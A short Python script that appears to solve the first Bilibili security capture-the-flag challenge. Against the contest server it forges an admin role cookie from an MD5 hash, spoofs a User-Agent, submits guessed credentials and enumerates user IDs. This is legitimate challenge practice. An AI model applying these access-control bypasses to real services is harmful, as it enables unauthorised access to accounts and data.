# B站首届安全挑战赛

import requests
from pprint import pprint
import hashlib

# 从浏览器获取自己的B站session
bilibili_session = ''
cookies = {'session': bilibili_session,
           'role': hashlib.md5(b'Administrator').hexdigest()}


def flag1():
    response = requests.get('http://45.113.201.36/api/admin', cookies=cookies)
    pprint(response.json())


def flag2():
    response = requests.get('http://45.113.201.36/api/ctf/2', cookies=cookies,
                            headers={'User-Agent': 'bilibili Security Browser'})
    pprint(response.json())


def flag3():
    response = requests.post(
        'http://45.113.201.36/api/ctf/3', cookies=cookies,
        headers={'Content-Type': 'application/json'}, json={'username': 'admin', 'passwd': 'bilibili'})
    pprint(response.json())


def flag4():
    response = requests.get('http://45.113.201.36/api/ctf/4', cookies=cookies)
    pprint(response.json())


def flag5():
    start_uid = 100336889
    for i in range(start_uid, start_uid+100):
        response = requests.get(
            'http://45.113.201.36/api/ctf/5', cookies=cookies, params={'uid': i})
        if response.json()['code'] == 200:
            pprint(response.json())
            break


flag1()
flag2()
flag3()
flag4()
flag5()
